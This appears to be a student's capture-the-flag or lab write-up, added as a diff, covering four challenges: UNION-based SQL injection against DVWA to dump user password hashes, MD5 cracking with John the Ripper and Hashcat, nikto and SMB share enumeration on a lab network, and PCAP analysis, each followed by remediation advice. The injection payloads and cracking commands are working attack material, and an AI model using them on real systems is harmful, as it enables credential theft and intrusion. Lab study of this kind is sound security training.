@@ -1,0 +1,110 @@
+# ----------------------------------------------------------------------------------------------------------- # 
+				# Challange 1 # SQL Injection (find smith's password
+
+"During the password cracking phase, both John the Ripper and Hashcat were utilized. 
+While Hashcat is the industry standard for large-scale engagements due to its GPU acceleration capabilities,
+John the Ripper yielded faster results in this specific engagement. 
+Because the assessment environment was a CPU-bound Virtual Machine without dedicated GPU passthrough, 
+John's CPU-optimized architecture proved more efficient for cracking the unsalted MD5 hashes."
+
+
+SQL_INjection manually
+SELECT first_name, last_name FROM users WHERE user_id = 'INPUT';
+1' AND '1'='1
+1' AND '1'='2
+
+1' ORDER BY 1 # // worked
+1' ORDER BY 2 # // worked 
+1' ORDER BY 3 # // returned error
+
+' UNION SELECT 1, 2 #
+' UNION SELECT version(), database() #
+' UNION SELECT user(), database() #
+
+' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = 'dvwa' #
+' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name = 'users' #
+
+' UNION SELECT user, password FROM users #
+
+Use: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name=’users’#
+Use: 1' OR 1=1 UNION SELECT user, password FROM users #
+
+
+
+smith:5f4dcc3b5aa765d61d8327deb882cf99
+
+in Kali 
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt smith_hash.txt
+john --show smith_hash.txt
+
+hashcat -m 0 -a 0 hash_only.txt /usr/share/wordlists/rockyou.txt
+
+hashcat -m 0 --show hash_only.txt
+
+1. Make sure the SQL code structure is fixed and that user input is handled as data only, not executable code, by using parameterized queries.
+
+2. Put input validation and sanitization into practice by rejecting or cleaning user input that contains strange characters or SQL keywords.
+
+3. Use the least privilege principle: Applications should use database accounts with the fewest possible permissions (no admin rights, for example).
+
+4. Use stored procedures: To minimize the creation of dynamic queries, encapsulate SQL logic in pre-established database procedures.
+
+5. Install a Web Application Firewall (WAF) and set up it rules to instantly identify and stop SQL injection attacks.
+# ------------------------------------------------------------------------------------------ #
+			 	# Challange 2 # HTTP Server Vulnerablities, misconfigurations
+
+nikto -h http://10.5.5.12
+
+config directories are exposed and accessable remotely
+in config dir in db_form.html
+flag is aWe-4975
+
+1. Disable directory indexing in the web server configuration — In Apache, set Options -Indexes in the .htaccess or virtual host config. In Nginx, disable autoindex.
+
+2. Place a default index file (e.g., index.html, index.php) in every directory — This ensures that if a user accesses a directory, the index file is displayed instead of a file listing.
+
+# ------------------------------------------------------------------------------------------- #
+				# Challange 3 # Exploit open SMP Shares
+
+nmap -vv -p 139,445 10.5.5.* | grep -e "open"
+Discovered open port 139/ tcp on 10.5.5.14
+Discovered open port 445/ tcp on 10.5.5.14
+
+enum4linux -a 10.5.5.14
+
+Share enumaration on 10.5.5.14
+
+Sharenames
+homes	
+workfiles
+PRINT$
+IPC$
+
+smbclient //10.5.5.14/PRINT$ -N
+ls
+cd OTHER 
+ls
+sxij42.txt
+get sxij42.txt
+exit
+cat sxij42.txt
+The code for this challange is NWs39691.
+
+Remidies
+1] Updates and Patches
+2] Network Segmentation
+1. Regular Patch Management
+
+2. Disable Unnecessary SMB Versions
+# -------------------------------------------------------------------------------------------- #
+				# Challange 4 # Analyze a PCAP File to Find Information
+
+ips 10.5.5.1 10.5.5.11
+/database-offline.php
+/data
+
+Flollowing tcp stream from the wireshark and openning the http://10.5.5.11/data/user_accounts.xml, Challange 4 answer found "21z-1478K"
+
+Remidies
+1] Implementing Access Contorl Lists ACLs: Define user permissions for files and directories to ensure onlt authorised users can access sensitive information. 
